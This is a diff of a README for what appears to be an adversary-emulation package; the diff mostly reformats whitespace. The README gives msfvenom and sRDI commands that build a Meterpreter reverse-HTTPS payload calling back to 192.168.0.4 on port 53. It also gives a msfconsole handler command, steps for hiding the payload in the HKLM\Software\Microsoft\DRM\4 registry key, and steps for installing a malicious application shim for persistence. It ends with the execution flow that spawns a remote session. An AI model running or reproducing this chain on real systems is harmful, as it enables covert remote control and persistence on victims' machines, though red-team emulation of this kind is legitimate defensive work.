@@ -3,21 +3,21 @@
 ### bin329.tmp
 
 `bin329.tmp` is a 32bit [sRDI converted meterpreter dll](https://github.com/monoxgas/sRDI).
-  -  `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=53 -f dll -o payload.dll`
-  - `git clone https://github.com/monoxgas/sRDI`
-  - `python3 sRDI/Python/ConvertToShellcode.py payload.dll`
-  - `mv payload.bin bin329.tmp`
+
+- `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=192.168.0.4 LPORT=53 -f dll -o payload.dll`
+- `git clone https://github.com/monoxgas/sRDI`
+- `python3 sRDI/Python/ConvertToShellcode.py payload.dll`
+- `mv payload.bin bin329.tmp`
 
   From `sudo msfconsole`
-   - `handler -p windows/meterpreter/reverse_https -H 192.168.0.4 -P 53`
 
+- `handler -p windows/meterpreter/reverse_https -H 192.168.0.4 -P 53`
 
 This payload will be stored in the registry at `HKLM\SOFTWARE\Microsoft\DRM\4` as a binary value by [prep_and_install_shim.ps1](prep_and_install_shim.ps1)
 
-
 ### prep_and_install_shim.ps1
 
-Launch from an interactive administrator PowerShell, [prep_and_install_shim.ps1](prep_and_install_shim.ps1) stores bin329.tmp into the registry, copies over files to `C:\Windows\Temp`, and installs the applicatin shim via `sdbinst.exe`. 
+Launch from an interactive administrator PowerShell, [prep_and_install_shim.ps1](prep_and_install_shim.ps1) stores bin329.tmp into the registry, copies over files to `C:\Windows\Temp`, and installs the applicatin shim via `sdbinst.exe`.
 
 ### dll329.dll
 
@@ -33,16 +33,17 @@ Simply click the `.sln` file to open with Visual Studio Code 2019. Then compile.
 
 #### Generating an sdb file from scratch
 
-Download the [Windows Assessment and Deployment Kit for Windows 10](https://support.microsoft.com/en-us/help/4027209/oems-adk-download-for-windows-10). You only need to select the `Application Compatibility Toolkit` during installation. 
+Download the [Windows Assessment and Deployment Kit for Windows 10](https://support.microsoft.com/en-us/help/4027209/oems-adk-download-for-windows-10). You only need to select the `Application Compatibility Toolkit` during installation.
 
-From an Administrator PowerShell/CMD shell 
- - `cd "C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit\Application Compatibility Toolkit\Compatibility Administrator (32-bit)"`
- - `.\Compatadmin.exe /x`
-   - `/x` is an undocumented argument that will enable more shims
+From an Administrator PowerShell/CMD shell
+
+- `cd "C:\Program Files (x86)\Windows Kits\10\Assessment and Deployment Kit\Application Compatibility Toolkit\Compatibility Administrator (32-bit)"`
+- `.\Compatadmin.exe /x`
+  - `/x` is an undocumented argument that will enable more shims
 
 - Click `Fix` to begin
   - `AccountingIQ` for name of program
-  - `Microsoft` for name of vendor 
+  - `Microsoft` for name of vendor
   - Browse to program you would like to shim (AccountingIQ.exe)
 
 - Click `Next` to skip the Compatability Mode section
@@ -69,7 +70,7 @@ The shim is now installed
 
 ## Execution Flow
 
-1) Encoded PowerShell 
+1) Encoded PowerShell
     - Drops `sdbE376.tmp` and `dll329.dll` to `C:\Windows\Temp`
     - Sets Reg key with binary data of meterpreter payload to `HKLM:\Software\Microsoft\DRM\4`
     - Invokes `sdbinst.exe` on `sdbE376.tmp` - Installs shim
@@ -85,7 +86,6 @@ The shim is now installed
     - Function runing in `SyncHost.exe` now reads payload from `HKLM:\Software\Microsoft\DRM\4` and executes it
 
 5) User level meterpreter session is spawned
-
 
 ### Process Tree of Execution
 
